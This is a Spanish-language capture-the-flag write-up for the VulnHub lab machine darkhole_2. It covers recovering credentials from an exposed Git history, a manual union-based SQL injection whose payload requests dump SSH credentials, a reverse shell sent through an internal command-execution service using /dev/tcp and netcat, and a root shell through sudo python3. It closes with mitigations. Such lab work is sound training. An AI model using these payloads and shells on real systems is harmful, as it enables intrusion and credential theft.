---
title: "VulnHub: darkhole_2"
date: 2025-10-09
tags:
  - writeup
  - vulnhub
  - sqli
  - git-enumeration
  - ssh
  - privilege-escalation
  - web-exploitation
related:
  - "[[SQLi-Manual]]"
  - "[[Git-Reconnaissance]]"
  - "[[Linux-Privesc]]"
  - "[[SSH-Techniques]]"
references:
  - https://www.vulnhub.com/entry/darkhole-2,740/
---
# CTF: Darkhole_2
![[cover.png]] 
>[!INFO] Información General
>Aquí encontrarás un Writeup de como hackear la máquina "darkhole_2" de VulnHub. A lo largo de la cual aprenderás a como funcionan diversos ataques de inyección SQL, en que consiste la enumeración básica de subdominios y nos aprovecharemos de un servicios expuesto bajo el puerto 9999 para realizar una escalada de privilegios.
---
## Objetivo

- Comprometer la máquina virtual [DarkHole_2](https://www.vulnhub.com/entry/darkhole-2,740/).
- Obtener acceso inicial mediante enumeración web.
- Escalar privilegios hasta root mediante abuso de servicios locales.
- Capturar las flags user.txt y root.txt
## Herramientas y Comandos Recomendados

| Herramienta | Función principal                             |
| ----------- | --------------------------------------------- |
| arp-scan    | Descubre hosts en la red.                     |
| nmap        | Escaneo y enumeración de puertos y servicios. |
| wget        | Descarga de archivos desde la web.            |
| git         | Control de versiones de código.               |
| Burp Suite  | Análisis y pruebas de tráfico web.            |
| curl        | Transferencia de datos y pruebas HTTP.        |
| netcat      | Utilidad multipropósito de red.               |
| ssh         | Acceso remoto seguro por consola.             |
| htop        | Monitorización avanzada de procesos.          |
| netstat     | Revisión de conexiones y puertos activos.     |
> [!TIP] Preparativos Personales:  
>Esta máquina vulnerable fue ejecutada bajo un entorno virtualizado usando **VMware Workstation** sobre un sistema operativo **Arch Linux**. Todas las herramientas fueron descargadas e instaladas de los repositorios oficiales o desde la **AUR**. 

---
# Informe General:

> [!Abstract] Resumen Técnico
> Se obtuvo acceso inicial mediante credenciales extraídas de commits de Git expuestos en la aplicación web, esto llevó a una explotación de inyección SQL (Burp Suite) en el parámetro "id" de la URL del dashboard. Esto permitió obtener credenciales SSH del usuario "jehad", admitiendo así una escalada de privilegios. Esto se logró abusando de un servicio PHP interno ejecutándose como el usuario "losy" en el usuario "jehad" bajo el puerto 9999, seguido de una explotación de permisos para ejecutar Python como root y **lograr una shell sin limites**.
## I. Identificación del Target

Lo primero que debemos hacer es la fase de reconocimiento, esto es indispensable para trazar el mapa de la infraestructura objetivo y saber exactamente a que nos estamos enfrentando. Casi siempre tu primer paso será determinar la dirección IP de la máquina objetivo, en mi caso será la maquina "`darkhole_2`" ubicada en mi red local (`vmnet1`).

Comando utilizado:
```
arp-scan -I vmnet1 --localnet
```

Parámetros:
- `arp-scan`: Herramienta de reconocimiento de red
- `-I`: Especifica el adaptador de red a escanear
- `--localnet`: Indica escaneo de toda la red local

![[darkhole_2.1.png]]
	El escaneo identifica la máquina objetivo en "`172.16.23.128`" dentro de la red `vmnet1`.

### Escaneo de Puertos

Una vez sabiendo la IP de la maquina, es bueno proceder a un escaneo exhaustivo para identificar los servicios en ejecución y obtener información de versiones. 

Comando utilizado:
```
nmap -p- --open -sVC -T4 -vvv -n -Pn 172.16.23.128
```

Parámetros:
- `nmap`: Herramienta de escaneo de redes.
- `-p- --open`: Escanea los 65535 puertos y reporta solo los abiertos.
- `-sVC`: Detecta servicios y ejecuta scripts básicos de reconocimiento
- `-T4`: Plantilla de velocidad agresiva
- `-vvv`: Salida verbose en tiempo real, útil para ver información en tiempo real.
- `-n`: Deshabilita resolución DNS para acelerar el escaneo
- `-Pn`: Omite host discovery y fuerza el reconocimiento de puertos

![[darkhole_2.2.png]]

Resultados resumidos:

| Puerto | Protocolo | Servicio     | Versión                 | Observaciones               |
| :----: | :-------: | :----------- | :---------------------- | :-------------------------- |
| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto     |
| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web: DarkHole V2 |

### Puerto 80 - Análisis HTTP

Un puerto 80 abierto normalmente quiere decir que el servidor está hosteando un servicio Web. Esto quiere decir que si entramos al navegador y colocamos la IP seguramente encontremos una página web.

Confirmación de Puerto 80 abierto en reporte de nmap:
```
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
```
![[darkhole_2.3.png.png]]
	Se identifica una aplicación web activa con TTL de 64 (indicador de sistema Linux) y servidor Apache httpd 2.4.41 corriendo sobre Sistema Ubuntu.

### Puerto 22 - SSH

Puerto 22 abierto:
```
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

Puerto SSH estándar disponible para acceso remoto con credenciales válidas.

### Enumeración de Repositorio Git

Los scripts básicos de reconocimiento de nmap revelaron información crítica:
```
|_http-title: DarkHole V2
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   172.16.23.128:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the..
|_    Last commit message: i changed login.php file for more secure
```
> [!warning] Repositorio Git Expuesto
> Se detectó un directorio .git accesible públicamente en http://172.16.23.128/.git/ con commits históricos potencialmente sensibles.

![[darkhole_2.4.png]]

Siempre que encuentres algún directorio de Git en un proyecto, puede valer la pena revisarlo para ver qué contiene. Es posible que hayan guardado o borrado información sensible, y esa es exactamente la información que buscamos descubrir. Existen varias formas de hacerlo, y en esta ocasión, procederé a descargar el repositorio completo para realizar un análisis forense detallado.

Comando para descargar repositorio:
```
wget -r http://172.16.23.128/.git/
```
![[darkhole_2.5.png]]
	Descargamos con éxito el proyecto y podemos ver su contenido.
### Análisis de Commits Git

Como queremos ver si hay información sensible dentro del proyecto solo debemos ver los logs del mismo, cosa que se puede hacer de forma muy sencilla.

Comando para revisar logs:
```
git log
```
![[darkhole_2.6.png]]

El historial de Git reveló 3 commits:

1. `0f1d821f48a9cf662f285457a5ce9af6b9feb2c4`: HEAD actual del proyecto
2. `a4d900a8d85e8938d3601f3cef113ee293028e10`: "I added login.php file with default credentials". **¡Información critica!**
3. `aa2a5f3aa15bb402f2b90a07d86af57436d64917`: "First Initialize" (commit inicial)

### Enumeración de Subdominios

El commit anterior nos indica que han agregado unas credenciales al archivo "`login.php`". Ya tenemos una pista de donde puede estar las credenciales, pero antes realicemos un último script basico de enumeración de nmap:

Comando:
```
nmap --script http-enum 172.16.23.128
```
![[darkhole_2.7.png]]
	`--script`: Me permite indicarle a nmap un script a ejecutar.
	`http-enum`: Script de enumeración de subdominios básicos.

Resultados:
```
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /.git/HEAD: Git folder
|   /config/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /style/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

Se confirma el subdominio "/login.php" mencionado en el commit.
![[8.png]]
	Tenemos una Login page, la cual seguramente tiene que ver con las credenciales anteriormente mencionadas. 
### Leak de Credenciales en Git

Ya con toda esta información está más que claro que necesitamos las credenciales para iniciar sesión en la página web, para esto verifiquemos el contenido del commit anterior:

Comando:
```
git show a4d900a8d85e8938d3601f3cef113ee293028e10
```
![[darkhole_2.9.png]]

> [!danger] Credenciales Expuestas
> El commit reveló credenciales de **administrador** embebidas en el código fuente del archivo **login.php**.

Fragmento del código encontrado:
```
+<?php
+session_start();
+require 'config/config.php';
+if($_SERVER['REQUEST_METHOD'] == 'POST'){
+    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
+        $_SESSION['userid'] = 1;
+        header("location:dashboard.php");
+        die();
```

Credenciales obtenidas:
- Email: lush@admin.com
- Password: 321
---
## II. Acceso Inicial (Explotación)

### Identificación de la Vulnerabilidad

- Tipo: Inyección SQL (SQLi) manual
- Ubicación: Parámetro id en http://172.16.23.128/dashboard.php?id=1
- Evidencia: Las credenciales lush@admin.com:321 permitieron acceso al dashboard

![[darkhole_2.10.png]]

El dashboard presenta un parámetro id en la URL susceptible a inyección SQL.

### Explotación con Burp Suite

![[darkhole_2.11.png]]
	Se interceptó la petición GET con Burp Suite y se activó el modo Repeater para pruebas de SQLi manual.

#### Proceso de Inyección SQL

**Paso 1 - Enumeración de usuarios:**

Solicitud modificada:
```
GET /dashboard.php?id=2 HTTP/1.1
```
![[darkhole_2.12.png]]
	Respuesta: 200 OK. Se accedió al perfil de otro usuario con campos vacíos.

**Paso 2 - Conteo de columnas:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+order+by+6--+- HTTP/1.1
```

Se identificaron 6 columnas activas mediante pruebas incrementales hasta error 500.

**Paso 3 - Identificación de campos inyectables:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,3,4,5,6--+- HTTP/1.1
```
![[darkhole_2.13.png]]
	Los campos 2, 3, 5 y 6 son inyectables y se muestran en la respuesta.

**Paso 4 - Enumeración de bases de datos:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(schema_name),4,5,6+from+information_schema.schemata--+- HTTP/1.1
```
![[darkhole_2.14.png]]
	Bases de datos identificadas: mysql, information_schema, performance_schema, sys, darkhole_2.

**Paso 5 - Enumeración de tablas en darkhole_2:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema.tables+where+table_schema%3d'darkhole_2'--+- HTTP/1.1
```
![[darkhole_2.15.png]]
	Tablas identificadas: ssh, users.

**Paso 6 - Enumeración de columnas en tabla ssh:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_schema%3d'darkhole_2'+and+table_name%3d'ssh'--+- HTTP/1.1
```
![[darkhole_2.16.png]]
	Columnas en tabla ssh: id, user, pass.

**Paso 7 - Extracción de credenciales SSH:**

Solicitud modificada:
```
GET /dashboard.php?id=2'+union+select+1,2,group_concat(id,0x3a,user,0x3a,pass),4,5,6+from+darkhole_2.ssh--+- HTTP/1.1
```
![[darkhole_2.17.png]]

> [!success] Credenciales SSH Obtenidas
> Usuario: jehad  
> Contraseña: fool

### Obtención de Shell SSH

Comando:
```
ssh jehad@172.16.23.128
```
![[darkhole_2.18.png]]
	Acceso exitoso a la máquina como usuario jehad.

---
## III. Post-Explotación y Privesc

### Enumeración Interna

**Inventario del sistema:**

Comando para ver kernel:
```
uname -a
```
![[darkhole_2.34.png]]
	Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64

Comando para ver versión del SO:
```
cat /etc/os-release
```
![[darkhole_2.33.png]]
	Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)

Comando para verificar privilegios sudo:
```
sudo -l
```
![[darkhole_2.32.png]]
	Resultado: El usuario jehad no tiene permisos sudo.

Comando para ver grupos:
```
id
```
![[darkhole_2.31.png]]
	Resultado: jehad no pertenece a grupos privilegiados.

Comando para listar usuarios:
```
cat /etc/passwd
```
![[darkhole_2.30.png]]
	Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).

Comando para ver historial:
```
history
```
![[darkhole_2.19.png]]
	Comandos críticos del historial:
	1. cd /home/losy
	2. cd /opt/web
	3. curl "http://localhost:9999/?cmd=id"
	4. ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129

> [!tip] ¡Servicio Interno Detectado!
> Gracias a los comandos ejecutados por el usuarios podemos entender que existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.

Comando para listar puertos en escucha:
```
netstat -tulpn
```
![[darkhole_2.20.png]]
	Confirmación: servicio en **LISTEN** bajo puerto 9999.

Comando para ver procesos:
```
htop
```
![[darkhole_2.21.png]]
	El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.

Comandos para revisar el script PHP:
```
cd /opt/web
cat index.php
```
![[darkhole_2.22.png]]
	Script PHP simple para ejecución remota de comandos vía parámetro cmd.

### Vector de Escalada

Exploración del directorio home:
![[darkhole_2.23.png]]
	Se encontró la flag user.txt en /home/.

#### Explotación del Servicio Interno

Prueba de concepto con curl:
```
curl "http://localhost:9999/?cmd=id"
```
![[darkhole_2.24.png]]
	El comando se ejecuta como usuario losy, confirmando RCE.

#### Reverse Shell como losy

Listener en máquina atacante:
```
nc -lvnp 443
```
![[darkhole_2.25.png]]
	Nos podemos en escucha para recibir la señal que vamos a enviar desde el servicio PHP.

Para mandar el payload lo debemos hacer en formato "URL Encode". Les dejo un ejemplo de como se vería el comando de forma "normal" y "URL Encoded".

Comando original:
```
curl "http://localhost:9999/?cmd=bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
```

URL Encoded:
```
curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
```
![[darkhole_2.26.png]]
	Shell inversa obtenida como losy.

> [!WARNING] Advertencia  
> Una vez establecida la conexión remota mediante netcat, la terminal puede no estar completamente operativa para la interacción directa. Por ello, es recomendable ejecutar un proceso de estabilización antes de continuar con la auditoría, asegurando así un entorno de trabajo más estable y funcional.
#### Estabilización de TTY

Comandos para estabilizar la shell:
```
/usr/bin/script -qc /bin/bash /dev/null
```
Luego CTRL+Z y ejecutar:
```
stty raw -echo; fg
```
Finalmente:
```
export TERM=xterm
```

#### Análisis del Historial de losy

Comando:
```
history
```
![[darkhole_2.27.png]]
> [!danger] Información Crítica en Historial
> Comandos encontrados:
> 1. sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
> 2. sudo python3 -c 'import os; os.system("/bin/sh")'
> 3. P0assw0rd losy:gang (credenciales expuestas)
> 
> Esto nos confirma que el usuario losy tiene permisos sudo para ejecutar Python como root bajo la credencial "gang".

### Escalada a Root
Comando para obtener shell root:
```
sudo python3 -c 'import os; os.system("/bin/sh")'
```
![[darkhole_2.0.png]]
	Shell de root obtenida. Flag root.txt capturada en directorio /root.

---
## Evidencias
1. Comando `whoami` y hostname ejecutado como root:
	![[darkhole_2.35.png]]

Flags capturadas:
- user.txt: `capturada en /home/`.
- root.txt: `capturada en /root/`.

> [!tip] Buenas prácticas de evidencia
> Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla para su reproducibilidad.

---
## Mitigación y Recomendaciones

**Repositorio Git expuesto:** Eliminar completamente el directorio .git de servidores en producción o bloquear el acceso mediante .htaccess. Nunca commitear credenciales en código fuente; usar variables de entorno o Password Managers.

**Inyección SQL:** Implementar consultas preparadas (prepared statements) en todas las interacciones con la base de datos. Validar y sanitizar todas las entradas del usuario mediante whitelists. Aplicar principio de mínimo privilegio en cuentas de base de datos.

**Servicio interno sin autenticación:** Implementar autenticación obligatoria en servicios internos. Usar firewalls locales para restringir acceso solo a procesos autorizados. No ejecutar servicios web como usuarios privilegiados.

**Historial de bash con credenciales:** Configurar HISTCONTROL=ignorespace y anteponer espacio a comandos sensibles. Implementar rotación de contraseñas y prohibir el uso de credenciales en comandos directos.

**Abuso de sudo con Python:** Restringir comandos sudo a scripts específicos sin capacidad de importar módulos arbitrarios. Revisar configuración de sudoers y eliminar permisos innecesarios. Implementar políticas de seguridad con SELinux o AppArmor.

---
## Conclusiones

**Lecciones aprendidas:** La exposición de repositorios Git con historial completo es una vulnerabilidad crítica que puede llevar a la filtración de credenciales. La inyección SQL manual sigue siendo efectiva cuando la validación de entradas es nula. Los servicios internos mal configurados y el historial de bash sin limpiar son vectores de escalada comunes.

**Complejidad real vs marcada:** La dificultad media es apropiada. Requiere conocimientos sólidos de enumeración web, SQLi manual y pensamiento lateral para identificar servicios locales.

> [!note] Mapa mental
> Técnicas relacionadas: [[Git-Enumeration]], [[SQLi-Manual]], [[SQLi-Union-Based]], [[Linux-Internal-Services]], [[Python-Sudo-Privesc]], [[SSH-Lateral-Movement]]

---

## Metadatos de Navegación

- Relacionados: [[VulnHub-Writeups]], [[Web-Exploitation]], [[SQLi-Techniques]], [[Linux-Privesc-Methods]], [[Git-Security]]
- Palabras clave: VulnHub, DarkHole, SQLi, Git, SSH, Reverse Shell, Sudo Privesc, Python Exploitation, Ubuntu 20.04
